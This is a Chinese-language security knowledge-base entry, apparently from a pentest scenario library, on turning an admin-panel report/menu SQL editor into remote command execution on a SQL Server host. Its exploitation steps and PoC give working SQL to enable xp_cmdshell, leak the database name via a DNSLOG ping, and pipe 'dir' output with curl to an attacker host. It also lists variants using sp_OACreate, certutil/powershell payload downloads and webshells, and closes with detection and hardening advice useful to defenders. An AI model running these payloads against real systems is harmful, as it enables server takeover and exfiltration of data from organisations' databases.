---
id: web-generic-sqli-admin-report-sql-editor-xp-cmdshell
title: 后台报表/菜单 SQL 编辑器可执行任意 SQL：SQL Server xp_cmdshell 命令执行
type: scenario
domain: web
path: web/generic/sqli
technique: admin-sql-editor-xp-cmdshell-rce
tags:
- sqli
- mssql
- xp-cmdshell
- admin-panel
- report
- rce
- sql-editor
- out-of-band
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V61
  verified_at: '2026-11-05T12:36:30+08:00'
  notes: 已对照原文与图25-36核对：系统管理-文件类型列表存在“报表sql/菜单sql”可编辑(图25/26)、菜单sql 写入 UNION SELECT db_name() 后前台申请文件在证明的性别字段回显库名(图27/28/29)、系统信息显示 Web 为 Linux 192.168.58.20 而 DB 为 SQL Server(图34/35)、xp_cmdshell ping <dbname>.dnslog.cn 在 DNSLOG 收到记录(图31/33)、最终 xp_cmdshell dir 2>&1 | curl 在 VPS 收到回显(图35/36)，与卡一致。未验证点：sp_configure 开启 xp_cmdshell 的中间回显未展示；PoC 未本机复跑；frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/generic/sqli/web-generic-sqli-admin-report-sql-editor-xp-cmdshell/
draft: false
kb_aliases:
- 报表 SQL 编辑器 RCE
- 菜单 SQL 注入
- 后台任意 SQL 执行
- SQL Server xp_cmdshell RCE
- 站库分离命令执行
- sp_configure xp_cmdshell
---

## 一句话结论

当后台把“报表 SQL/菜单 SQL”作为可编辑配置保存，并在前台文件申请时整段执行时，拥有超管权限的攻击者可写入 `sp_configure` + `xp_cmdshell` 语句，让 SQL Server 以服务账户执行系统命令；案例通过 `dir 2>&1 | curl` 把 Windows 命令输出外带到 VPS。

## 原理

- 系统把报表/菜单的查询语句存为配置，前端用户每次申请文件时，后端读取该 SQL 并执行，把结果填入文件模板。
- 该 SQL 编辑器对超级管理员开放，且没有对语句类型做限制（不限于 SELECT），等于一个“任意 SQL 执行”入口。
- SQL Server 的 `xp_cmdshell` 扩展存储过程可创建 `cmd.exe` 子进程执行命令；默认关闭，但 sysadmin/control server 权限可用 `sp_configure 'show advanced options',1` + `RECONFIGURE`、`sp_configure 'xp_cmdshell',1` + `RECONFIGURE` 开启。
- 由于应用与数据库是站库分离（Web 在 Linux，SQL Server 在 Windows），命令必须在数据库主机上执行；案例最初按 Linux 命令测试失败，改用 Windows `dir` 后成功，说明命令执行身份是 SQL Server 服务账户。
- 命令输出可通过 `xp_cmdshell 'dir 2>&1 | curl -X POST --data @- http://attacker:port'` 外带；也可用 DNSLOG 的 `ping <dbname>.dnslog.cn` 验证出网与 DB 名。
- 这条链与 SQL 注入的区别：不需要注入点，攻击者已拥有后台 SQL 编辑权限；本质是“高危功能 + 过高数据库权限”的配置问题。

## 触发条件

- 攻击者拥有可编辑报表/菜单 SQL 的超级管理员权限。
- 后端会执行该 SQL，且数据库为 SQL Server，连接账户具备 sysadmin/control server 权限（或可开启 xp_cmdshell）。
- `xp_cmdshell` 未被策略强制锁定；SQL Server 服务账户可执行系统命令。
- 数据库主机可出网（用于 DNS/HTTP 外带），或攻击者能通过其他方式读取命令输出。

## 利用步骤

1. 在后台找到报表/菜单 SQL 编辑功能，确认修改后会影响前台某类文件申请。
2. 选择访问量最小的文件类型，避免影响业务；先用 `SELECT db_name();` 验证 SQL 可执行并观察回显/外带。
3. 用 DNSLOG 验证数据库出网：`ping <dbname>.dnslog.cn`（通过 `xp_cmdshell`）。
4. 开启 xp_cmdshell：
   `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`
5. 执行命令并外带输出：`EXEC xp_cmdshell 'dir 2>&1 | curl -X POST --data @- http://attacker:port'`。
6. 注意站库分离：Web 主机是 Linux 不代表 DB 主机是 Linux；按 SQL Server 所在 Windows 主机调整命令。

## PoC

```sql
-- 1) 验证 SQL 执行与数据库名（可 UNION 到原有查询）
SELECT xb FROM dbo.cxsyxm a
LEFT JOIN z_V_xsjbxxb b ON a.xh = b.xh
WHERE a.xh = '<学号>' AND a.rn = '<选中值>'
UNION SELECT db_name();

-- 2) DNSLOG 验证出网
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
DECLARE @dbName NVARCHAR(128);
DECLARE @cmd NVARCHAR(400);
SET @dbName = DB_NAME();
SET @cmd = 'ping ' + @dbName + '.xxxx.dnslog.cn';
EXEC xp_cmdshell @cmd;

-- 3) Windows 命令执行并 HTTP 外带输出
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'dir 2>&1 | curl -X POST --data @- http://attacker:port';
```

```text
# 预期：DNSLOG 收到 <dbname>.xxxx.dnslog.cn 解析；
# VPS 收到 dir 输出；若执行 Linux 命令失败，改 Windows 命令。
```

## 变体与关联

- 变体：若 xp_cmdshell 被禁用，用 OLE 自动化 `sp_OACreate 'WScript.Shell'` 执行命令。
- 变体：通过 `certutil`/`bitsadmin`/`powershell` 下载载荷，或写 WebShell 到数据库主机；站库分离时需确认 Web 根目录不在 DB 主机。
- 变体：用 DNS 外带短数据（库名、主机名），用 HTTP POST 外带长输出。
- 关联：[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（SQL 注入入口的同一 xp_cmdshell 链）、[[web-generic-sqli-dnslog-oob-exfiltration]]（DNS 外带）、[[web-generic-auth-roleid-roleids-parameter-tampering-admin]]（获取超管权限的前置步骤）。
- 边界：SQL 编辑器只允许 SELECT/有语句白名单、数据库账户非 sysadmin、xp_cmdshell 被策略锁定且无法开启、DB 主机不出网且无其他回显通道时，本场景不成立或降级。

## 检测与防御

- 检测：报表/菜单 SQL 中出现 `sp_configure`、`xp_cmdshell`、`RECONFIGURE`、`xp_cmdshell` 的 `curl`/`ping`/`certutil`；SQL Server ERRORLOG 中 `xp_cmdshell changed from 0 to 1`；sqlservr.exe 派生 cmd.exe/curl/ping；数据库主机异常外联。
- 修复：不要把可编辑 SQL 暴露给后台管理员；如必须，限制为参数化 SELECT 模板/白名单字段，禁止多语句与系统存储过程；数据库连接账户最小权限，禁止 sysadmin。
- 加固：生产环境保持 xp_cmdshell/OLE 自动化关闭并用策略锁定；数据库主机禁止出网；对 sp_configure 变更与 sqlservr 子进程告警；超管操作二次审批与审计。
